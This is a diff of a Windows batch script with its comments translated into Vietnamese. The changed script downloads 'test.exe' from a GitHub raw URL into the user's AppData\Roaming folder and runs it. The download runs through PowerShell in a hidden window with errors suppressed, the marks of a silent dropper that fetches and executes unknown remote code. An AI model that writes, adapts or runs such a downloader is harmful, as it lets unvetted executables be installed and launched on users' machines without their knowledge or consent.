@@ -2,30 +2,30 @@
 setlocal
 
 set "file=test.exe"
-set "url=https://example.com/path/to/your/test.exe"
+set "url=https://github.com/rspvn/a/raw/main/test.exe"
 set "folder=%USERPROFILE%\AppData\Roaming\test"
 
-:: Create folder if it does not exist
+:: Tạo thư mục nếu chưa tồn tại
 if not exist "%folder%" (
     mkdir "%folder%"
 )
 
-:: Check if file exists and run it
+:: Kiểm tra nếu tệp đã tồn tại và khởi chạy
 if exist "%folder%\%file%" (
     start "" "%folder%\%file%"
     exit /b
 ) else (
-    echo Downloading file...
+    echo Đang tải tệp...
     powershell -NoProfile -WindowStyle Hidden -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%folder%\%file%' -ErrorAction SilentlyContinue"
 
-    :: Verify the file was downloaded
+    :: Kiểm tra xem tệp đã tải xong chưa
     if exist "%folder%\%file%" (
         start "" "%folder%\%file%"
     ) else (
-        echo Download failed.
+        echo Tải tệp thất bại.
     )
     
-    :: Close CMD window after 5 seconds
+    :: Đóng cửa sổ CMD sau 5 giây
     timeout /t 5 /nobreak >nul
     exit /b
 )
